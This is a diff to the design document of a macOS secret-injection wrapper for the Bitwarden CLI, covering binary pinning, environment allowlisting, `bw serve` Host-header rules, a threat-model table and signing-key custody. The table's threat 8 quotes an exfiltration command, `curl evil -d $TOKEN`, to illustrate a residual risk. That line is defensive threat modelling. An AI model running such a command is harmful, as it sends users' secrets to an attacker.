@@ -232,10 +232,16 @@ marked *tested* or *inferred*):
 
 Driver rules:
 
-1. **Pinned binary.** Preferred: the signed GitHub-release `bw`, checked on every run
-   against a code requirement on team `LTZ2PFU5D6`. Also accepted: Homebrew's Node build,
-   pinned as absolute paths of `node` and the script plus SHA-256 (trust on first use at
-   `setup`). Anything else is refused. The pin lives in the protected item (5.8).
+1. **Pinned binary.** Preferred: the signed GitHub-release `bw`, pinned by its absolute path
+   (a regular file, not a symlink) and checked on every run against a code requirement on team
+   `LTZ2PFU5D6`. Anything else is refused, **including Homebrew's Node build**: `bw.js` loads
+   about thirty packages from `node_modules`, webpack chunks and wasm from beside it at run
+   time (the code that receives the master password), and Homebrew's prefix is writable by the
+   user, so a hash of `node` plus `bw.js` would call code "pinned" that nobody checked
+   (review finding, verified against `@bitwarden/cli` 2026.10.0). Hashing the whole package
+   tree would still leave Homebrew's dylibs. `setup` therefore asks for the signed release.
+   The pin lives in the protected item (5.8). The check is made once, just before the spawn; it narrows
+   the swap window for a file the user can write, it does not close it (see 5.1).
 2. **Allowlisted environment, nothing inherited:** `HOME`, `LANG`,
    `BITWARDENCLI_APPDATA_DIR` (wardenrun's own dir), `BW_NOINTERACTION=true`, a `PATH`
    containing only the pinned directories, and `NODE_EXTRA_CA_CERTS`/`https_proxy` only
@@ -249,6 +255,11 @@ Driver rules:
    (`deletedDate` null, member of C, exactly one) → `lock`. Never `get <name>`, never
    `--search`, never `--session`. `sync` runs every time by default (`--offline` skips it)
    because a stale secret fails confusingly; this is a design call.
+   `bw` ORs its `--collectionid` and `--organizationid` filters (read in `list.command.ts`,
+   2026.10.0): the reply is every item of the organization, plus any in the collection. That
+   is why the item check ("member of C") is wardenrun's own, and why the dedicated account
+   should see only the allowed collection. wardenrun asks once per allowed collection; one
+   request for the organization would return the same items (deferred, ledger).
 6. **How the master password and session reach `bw`: a decision ladder, settled by a spike
    that opens PR3** (it needs a real Vaultwarden test server; `bw serve` without a logged-in
    profile exits immediately with "You are not logged in", so it could not be probed in
@@ -257,7 +268,10 @@ Driver rules:
      an inherited socketpair (present in `serve.command.ts`, undocumented). The password goes
      in the `POST /unlock` body and items come back over the same socket. No password and
      no `BW_SESSION` in any argv or environment, and no TCP port. Needs the profile logged
-     in by `setup` first. Its Host/Origin guards require `Host: localhost`.
+     in by `setup` first. Its Host/Origin guards (`bw` 2026.10.0, read in the source) accept only
+     `localhost:<port>`, `127.0.0.1:<port>` and `[::1]:<port>` plus the machine's own name with
+     the port, and the port is added to the name even for the socket mode: wardenrun starts
+     `serve --port 8087` and sends `Host: localhost:8087`; a bare `Host: localhost` gets 403.
    - **b.** `unlock --passwordfile /dev/fd/N` fed by a pipe, then `BW_SESSION` in the
      environment of each short-lived `bw` child. Leaves `BW_SESSION` visible to `ps eww`
      for seconds (threat 16).
@@ -382,7 +396,8 @@ later hardening.
 - `~/.config/wardenrun/bw/`: wardenrun's **own** `BITWARDENCLI_APPDATA_DIR`, so it never
   touches or depends on the user's personal `bw` session.
 - **In the protected keychain item** (JSON blob): server URL, account e-mail, organization
-  and allowed collection IDs, the master password, and the pinned `bw`/`node` identity.
+  and allowed collection IDs, the master password, and the pinned `bw` identity (team
+  ID and absolute path of the signed release).
   Changing any of it goes through `wardenrun setup`, which needs the master password typed by
   a human at a TTY plus an approval dialog that shows old and new values (threat 15).
 - `wardenrun doctor`: prints tier, signature flags, hardening status, `bw` pin status,
@@ -408,7 +423,7 @@ profile on disk.
 | 3 | Run `wardenrun run X -- cmd` | Human decides | Full resolved command line (400-character cap, over-long commands are denied, never truncated), parent; executable hash and cwd in the audit log; one pending prompt at a time; 60 s timeout; lockout after repeated denials |
 | 4 | Fake the approval | Not possible | No clickable "Approve" exists. The only gesture is the system biometric sheet. Password fallback is off by default. No window server session (ssh, cron) means deny. |
 | 5 | Inject code into wardenrun (`DYLD_*`, debugger) | Blocked | Hardened runtime, `PT_DENY_ATTACH`, refuse to start with `DYLD_*` set (tested for `DYLD_INSERT_LIBRARIES`) |
-| 6 | Steer wardenrun into running a malicious `bw` (PATH, `NODE_OPTIONS`, edited config) and capture the master password | Blocked | `bw` is called by pinned absolute path; its identity (Bitwarden's Team ID signature, or `node` + script hash) is stored in the protected item; its environment is built from an allowlist; on rung a/b of 5.2.6 the master password is not in env or argv |
+| 6 | Steer wardenrun into running a malicious `bw` (PATH, `NODE_OPTIONS`, edited config) and capture the master password | Blocked | `bw` is called by pinned absolute path; its identity (Bitwarden's Team ID signature; the Node build is refused, 5.2 rule 1) is stored in the protected item; its environment is built from an allowlist; on rung a/b of 5.2.6 the master password is not in env or argv |
 | 7 | Replace the `wardenrun` binary or alias it | **Not protected.** Install dirs are user-writable and a fake dialog can phish. | `wardenrun doctor` checks the signature requirement and install location; the README publishes the certificate hash and says to verify |
 | 8 | Approved command prints or sends the secret (`curl evil -d $TOKEN`, a script that logs it) | **Not protected** | That is why the dialog shows the full command line. Masking is an accident guard (raw, base64, URL, hex, JSON-escaped, shell-quoted), not an exfiltration barrier (`rev`, rot13, splitting beat it). |
 | 9 | Read the injected env of a running child with `ps eww` | **Not protected for env injection** (tested; ordinary binaries leak, Apple platform binaries do not) | Prefer `--stdin` for tools that support it; keep commands short-lived; documented. Temp-file mode has the same exposure while the file exists. |
@@ -502,13 +517,13 @@ polkit-gated root helper or a TPM-sealed credential; this needs its own design.
 
 ## 11. Open decisions and design calls
 
-**Open decision** (to be resolved by the maintainer before the first release)
+**Decided by the maintainer**
 
 1. **Signing-key custody (the price of not paying Apple).** Every release is signed with a
-   self-signed certificate whose private key the maintainer must keep: a CI secret plus one
+   self-signed certificate whose private key the maintainer keeps: a CI secret plus one
    offline backup in the maintainer's own password manager. Losing it means a new
-   certificate and everyone re-running `setup`; leaking it is threat 18. This has to be
-   accepted before the first release. (Apple Developer Program: declined by the maintainer on
+   certificate and everyone re-running `setup`; leaking it is threat 18. Accepted by the
+   maintainer on 2026-10-20. (Apple Developer Program: declined by the maintainer on
    2026-10-18.)
 
 **Design calls** (open to review)
